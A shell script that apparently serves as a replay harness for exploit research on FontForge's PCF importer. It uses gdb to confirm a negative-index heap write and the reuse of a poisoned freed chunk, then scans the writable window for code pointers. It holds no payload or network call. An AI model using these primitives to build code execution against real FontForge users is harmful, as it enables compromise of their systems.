#!/bin/sh
# fontforge2shell W26: correct negative-index reach and scan later objects.
# getformint16() does not sign-extend: accepted negative indices are only
# -256..-1 (EOF or a missing high byte), so the writable window is 1024 bytes.
# size-71.pcf survives its poisoned free; choice-4.pcf then reuses encs as
# pcf_properties.props. Scan that actual window against every executable map.
# Prerequisites: build-plain and build-nopie. No network or loopback service.
set -u
cd "$(dirname "$0")" || exit 2
[ -x build-plain/bin/fontforge ] || { echo 'missing build-plain' >&2; exit 2; }
[ -x build-nopie/bin/fontforge ] || { echo 'missing build-nopie' >&2; exit 2; }
[ -f size-71.pcf ] || { echo 'missing size-71.pcf; run replay-real.sh' >&2; exit 2; }
[ -f choice-4.pcf ] || { echo 'missing choice-4.pcf; run replay-real.sh' >&2; exit 2; }

python3 make-range-case.py >/dev/null || exit 2
for lane in pie nopie; do
    case "$lane" in
        pie) bin=build-plain/bin/fontforge ;;
        nopie) bin=build-nopie/bin/fontforge ;;
    esac
    printf 'New()\nImport("%s/size-71.pcf")\nImport("%s/choice-4.pcf")\nSave("/tmp/ff2s-w26-%s.sfd")\n' "$PWD" "$PWD" "$lane" > "w26-later-$lane.ff"
    printf 'set pagination off\nbreak fvimportbdf.c:1751 if glyph < 0\nrun -script %s/w26-later-%s.ff\nprintf "W26 store encs=%%p glyph=%%d i=%%d\\n", encs, glyph, i\nset $w26e = encs\nbreak fvimportbdf.c:1469 if props == $w26e\ncontinue\nprintf "W26 consumer props=%%p encs=%%p cnt=%%d\\n", props, $w26e, cnt\ndump binary memory /tmp/ff2s-w26-later-%s.bin (char*)$w26e-131072 (char*)$w26e\ninfo proc mappings\nbreak sfd.c:1671\ncontinue\nprintf "W26 later pc=%%p\\n", $pc\nquit\n' "$PWD" "$lane" "$lane" > "gdb-w26-$lane.cmd"
    gdb -q -batch -x "gdb-w26-$lane.cmd" "$bin" > "gdb-w26-$lane.out" 2>&1
    python3 scan-w26.py "/tmp/ff2s-w26-later-$lane.bin" "gdb-w26-$lane.out" > "scan-w26-$lane.out"
    printf 'set pagination off\nbreak fvimportbdf.c:1750\nrun -script %s/range-full.ff\nprintf "RANGE full glyph=%%d accepted=%%d\\n", glyph, glyph != 0xffff && glyph < b->glyphcnt\ncontinue\nrun -script %s/range-partial.ff\nprintf "RANGE partial glyph=%%d accepted=%%d\\n", glyph, glyph != 0xffff && glyph < b->glyphcnt\ncontinue\nquit\n' "$PWD" "$PWD" > "gdb-w26-range-$lane.cmd"
    gdb -q -batch -x "gdb-w26-range-$lane.cmd" "$bin" > "gdb-w26-range-$lane.out" 2>&1
done

fail=0; total=0
check() {
    label=$1; shift
    total=$((total+1))
    if "$@"; then printf 'PASS %s\n' "$label"; else printf 'FAIL %s\n' "$label"; fail=$((fail+1)); fi
}
has() { grep -qF "$1" "$2"; }
lacks() { ! grep -qF "$1" "$2"; }
for lane in pie nopie; do
    check "$lane negative-glyph store reached" has 'glyph=-2 i=0' "gdb-w26-$lane.out"
    check "$lane poisoned chunk reaches real props consumer" has 'W26 consumer props=' "gdb-w26-$lane.out"
    check "$lane consumer pointer equals original encs" grep -Eq 'W26 consumer props=(0x[0-9a-f]+) encs=\1 cnt=3' "gdb-w26-$lane.out"
    check "$lane scan produced a verdict" grep -Eq '^RESULT (NONE|ASCII_ONLY|CODE_POINTER_CANDIDATES)$' "scan-w26-$lane.out"
    check "$lane window has no code-pointer candidate" lacks 'RESULT CODE_POINTER_CANDIDATES' "scan-w26-$lane.out"
    check "$lane complete high-bit index stays unsigned and rejected" has 'RANGE full glyph=48882 accepted=0' "gdb-w26-range-$lane.out"
    check "$lane missing high byte yields accepted negative index" has 'RANGE partial glyph=-14 accepted=1' "gdb-w26-range-$lane.out"
    check "$lane scan uses the actual 1024-byte window" has 'WINDOW encs-1024..encs' "scan-w26-$lane.out"
done
for lane in pie nopie; do
    check "$lane reaches later Save consumer" has 'W26 later pc=' "gdb-w26-$lane.out"
done

echo '=== W26 hashes ==='
sha256sum scan-w26-pie.out scan-w26-nopie.out gdb-w26-range-pie.out gdb-w26-range-nopie.out
echo "REPLAY_W26_OK: $total checks, $fail failed"
[ "$fail" -eq 0 ]
